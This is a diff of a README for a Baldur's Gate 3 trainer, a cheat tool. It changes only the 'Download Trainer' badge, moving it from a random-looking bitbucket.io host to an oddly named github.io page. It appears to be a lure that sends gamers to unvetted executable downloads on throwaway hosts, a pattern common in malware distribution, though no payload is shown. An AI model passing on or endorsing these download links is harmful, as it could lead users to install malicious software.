@@ -4,7 +4,7 @@
 
 A gamer-friendly walkthrough to BG3 trainers—features, install steps, safety talk, and system needs—served with comparisons, slang, and zero grind.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload13.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Baldur-s-Gate-3-Trainer-sifyw.github.io/.github)
 
 ## Product Description
 
